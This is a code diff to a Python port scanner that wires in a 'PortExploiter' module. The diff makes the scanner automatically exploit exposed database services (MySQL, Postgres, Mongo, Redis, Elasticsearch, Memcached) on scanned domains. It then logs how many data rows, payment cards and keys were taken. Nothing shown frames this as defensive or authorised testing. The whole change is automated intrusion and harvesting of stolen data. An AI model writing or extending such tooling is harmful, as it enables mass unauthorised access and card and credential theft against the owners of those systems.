@@ -21,6 +21,8 @@ from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional, Set, Tuple
 from urllib.parse import urlparse
 
+from port_exploiter import PortExploiter, FullExploitReport
+
 logger = logging.getLogger("port_scanner")
 
 
@@ -231,6 +233,13 @@ class PortScanner:
         # Dedup
         self._reported: Set[str] = set()
 
+        # Port Exploiter — auto-exploit high-value open ports
+        self.exploiter = PortExploiter(
+            reporter=self.reporter,
+            db=self.db,
+            config=self.config,
+        )
+
     # ─────────────────────────────────────────────
     #   PUBLIC API
     # ─────────────────────────────────────────────
@@ -375,6 +384,25 @@ class PortScanner:
                     await self.reporter.send_message(text)
                 except Exception as e:
                     logger.debug(f"Port scan report failed: {e}")
+
+        # ── Auto-exploit high-value ports (databases, Redis, ES, Memcached) ──
+        exploitable = result.database_ports  # MySQL, PG, Mongo, Redis, ES, etc.
+        if exploitable and result.ip:
+            try:
+                exploit_report = await self.exploiter.auto_exploit(
+                    domain=domain,
+                    ip=result.ip,
+                    port_result=result,
+                )
+                # Attach to result for callers
+                result._exploit_report = exploit_report
+                if exploit_report.total_rows:
+                    logger.info(
+                        f"[PortExploit] {domain}: {exploit_report.total_rows} rows, "
+                        f"{exploit_report.total_cards} cards, {exploit_report.total_keys} keys"
+                    )
+            except Exception as e:
+                logger.debug(f"Port exploit failed for {domain}: {e}")
 
         return result
 
